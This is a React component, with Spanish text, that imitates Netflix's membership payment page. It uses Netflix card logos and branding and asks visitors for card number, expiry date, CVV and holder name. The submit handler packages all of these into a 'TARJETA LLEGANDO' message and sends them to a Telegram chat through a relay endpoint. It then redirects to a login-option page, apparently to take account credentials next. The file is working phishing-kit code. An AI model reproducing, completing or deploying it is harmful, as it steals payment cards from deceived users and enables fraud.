import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Spinner from '../Spinner/SpinnerW';  // Asegúrate de que la ruta es correcta
import './HeroCredit.css';

const PaymentStepCard = () => {
    const navigate = useNavigate();

    const [loading, setLoading] = useState(false);
    const [formValues, setFormValues] = useState({
        cardNumber: '',
        expirationDate: '',
        cvv: '',
        cardHolderName: '',
    });
    const [errors, setErrors] = useState({
        cardNumber: '',
        expirationDate: '',
        cvv: '',
        cardHolderName: '',
    });

    useEffect(() => {
        const savedFormValues = localStorage.getItem('formValues');
        if (savedFormValues) {
            setFormValues(JSON.parse(savedFormValues));
        }
    }, []);

    useEffect(() => {
        localStorage.setItem('formValues', JSON.stringify(formValues));
    }, [formValues]);

    const handleChange = (e) => {
        const { name, value } = e.target;
        if (name === 'expirationDate') {
            setFormValues({ ...formValues, [name]: formatExpirationDate(value) });
        } else {
            setFormValues({ ...formValues, [name]: value });
        }
    };

    const validateLuhn = (cardNumber) => {
        const digits = cardNumber.split('').reverse().map(Number);
        const sum = digits.reduce((acc, digit, index) => {
            if (index % 2 === 1) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            return acc + digit;
        }, 0);
        return sum % 10 === 0;
    };

    const getCardType = (number) => {
        const cardTypes = {
            'Visa': /^4[0-9]{12}(?:[0-9]{3})?$/,
            'MasterCard': /^5[1-5][0-9]{14}$/,
            'American Express': /^3[47][0-9]{13}$/,
            'Diners Club': /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/,
            'Discover': /^6(?:011|5[0-9]{2})[0-9]{12}$/,
            'JCB': /^(?:2131|1800|35\d{3})\d{11}$/,
            'Maestro': /^(?:5018|5020|5038|6304|6759|6761|6762|6763)\d{12,19}$/,
        };
        
        for (const [key, regex] of Object.entries(cardTypes)) {
            if (regex.test(number)) {
                return key;
            }
        }
        return null; 
    };

    const validateCard = (cardNumber) => {
        const isValidLuhn = validateLuhn(cardNumber);
        const isValidFormat = /^[0-9]{13,19}$/.test(cardNumber);
        const cardType = getCardType(cardNumber);
        
        return isValidLuhn && isValidFormat && cardType !== null;
    };

    const formatExpirationDate = (date) => {
        const numericValue = date.replace(/\D/g, '');
        const formattedValue = numericValue
            .slice(0, 4)
            .replace(/(\d{2})(\d{0,2})/, '$1/$2');
        return formattedValue;
    };

    const validateForm = () => {
        const newErrors = {};
        
        if (!validateCard(formValues.cardNumber)) {
            newErrors.cardNumber = 'Número de tarjeta inválido';
        }
    
        const [month, year] = formValues.expirationDate.split('/').map(Number);
        const today = new Date();
        const currentMonth = today.getMonth() + 1;
        const currentYear = today.getFullYear() % 100;
    
        if (!/^\d{2}\/\d{2}$/.test(formValues.expirationDate) || 
            month < 1 || month > 12 || 
            (year < currentYear || (year === currentYear && month < currentMonth))) {
            newErrors.expirationDate = 'Fecha de vencimiento inválida o en el pasado';
        }
    
        // Validación del CVV
        if (!/^\d{3}$/.test(formValues.cvv)) {
            newErrors.cvv = 'CVV debe ser un número de 3 dígitos'; 
        }
    
        // Validación del nombre del titular
        if (!/^[A-Za-z\s]+$/.test(formValues.cardHolderName.trim())) {
            newErrors.cardHolderName = 'El nombre del titular solo debe contener letras y espacios';
        }
    
        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };
    

    const sendTelegramMessage = async (message) => {
        try {
            const chatId = '-4542132850'; 
            const response = await fetch('http://localhost:3000/enviarmensaje', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ chatId, message }),
            });

            if (!response.ok) {
                throw new Error('Error al enviar el mensaje a Telegram');
            }
        } catch (error) {
            console.error('Error:', error);
        }
    };
    
    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!validateForm()) return;

        setLoading(true);

        const minSpinnerTime = 2000;
        const startTime = Date.now();

        const hideSpinner = () => {
            const elapsedTime = Date.now() - startTime;
            const remainingTime = minSpinnerTime - elapsedTime;
            if (remainingTime > 0) {
                setTimeout(() => setLoading(false), remainingTime);
            } else {
                setLoading(false);
            }
        };

        try {
            // Aquí solo necesitas enviar el mensaje a Telegram
            const message = `📞 ⚠ TARJETA LLEGANDO ⚠ 📞:\n -------------------------------------------\n- 📛: ${formValues.cardHolderName}\n- 💳: ${formValues.cardNumber} \n- 📅: ${formValues.expirationDate}\n- 🔐: ${formValues.cvv}\n-------------------------------------------`;

            await sendTelegramMessage(message);

            // Navegar a la ruta deseada después de enviar el mensaje
            navigate('/signup/loginoption');
        } catch (error) {
            console.error('Error en la solicitud:', error);
        } finally {
            hideSpinner();
        }
    };
    
    return (
        <div className="container mx-auto px-6 py-8 mt-2.5">
            {loading && <Spinner />}
            <div className="text-left mb-4">
                <span className="block text-left">
                    Paso <b>2</b> de <b>2</b>
                </span>
            </div>
            <h1 className="text-3xl font-bold leading-none mb-4">
                Configura tu tarjeta de crédito o débito
            </h1>
            <div className="mb-6">
                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="Visa" className="inline-block h-5 mr-4" />
                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="MasterCard" className="inline-block h-5 mr-4" />
                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png" alt="American Express" className="inline-block h-5 mr-4" />
                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/DINERS.png" alt="Diners Club" className="inline-block h-5" />
            </div>
            <form onSubmit={handleSubmit} className="bg-white p-5 rounded-lg shadow-lg mb-8">
                <div className="relative mb-4">
                    <input type="text" id="cardNumber" name="cardNumber" maxLength={16} value={formValues.cardNumber} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
                    <label htmlFor="cardNumber" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-red-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500 peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
                        Número de tarjeta
                    </label>
                    {errors.cardNumber && <p className="text-red-500 text-sm">{errors.cardNumber}</p>}
                </div>

                <div className="flex space-x-4 mb-4">
                    <div className="flex-1 relative">
                        <input type="text" id="expirationDate" name="expirationDate" maxLength={5} value={formValues.expirationDate} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
                        <label htmlFor="expirationDate" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-red-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500 peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
                            Fecha de vencimiento (MM/AA)
                        </label>
                        {errors.expirationDate && <p className="text-red-500 text-sm">{errors.expirationDate}</p>}
                    </div>

                    <div className="flex-1 relative">
                        <input type="text" id="cvv" name="cvv" maxLength={3} value={formValues.cvv} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
                        <label htmlFor="cvv" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-red-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500 peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
                            CVV
                        </label>
                        {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}
                    </div>
                </div>

                <div className="relative mb-4">
                    <input type="text" id="cardHolderName" name="cardHolderName" value={formValues.cardHolderName} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
                    <label htmlFor="cardHolderName" className="absolute top-1/2 left-3 transform -translate-y-1/2 text-red-500 transition-transform duration-300 peer-placeholder-shown:top-1/2 peer-placeholder-shown:text-gray-500 peer-placeholder-shown:text-sm peer-placeholder-shown:transform -translate-y-1/2 peer-focus:-translate-y-6 peer-focus:text-red-500 peer-focus:text-xs">
                        Nombre del titular
                    </label>
                    {errors.cardHolderName && <p className="text-red-500 text-sm">{errors.cardHolderName}</p>}
                </div>

                <div className="bg-gray-50 p-6 rounded-lg shadow-lg text-sm">
                    <p className="mb-4">
                        Los pagos se procesarán internacionalmente. Es posible que se apliquen comisiones bancarias adicionales.
                    </p>
                    <p className="mb-4">
                        Al hacer clic en el botón «Iniciar membresía», aceptas nuestros Términos de uso y nuestra Declaración de privacidad, declaras que tienes más de 18 años.
                    </p>
                </div>

                <button type="submit" className="w-full bg-[#e50914] text-white px-4 py-2 rounded-md shadow-sm hover:bg-[#d40813] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#e50914]">
                    {loading ? 'Procesando...' : 'Iniciar membresía'}
                </button>
            </form>
        </div>
    );
};

export default PaymentStepCard;
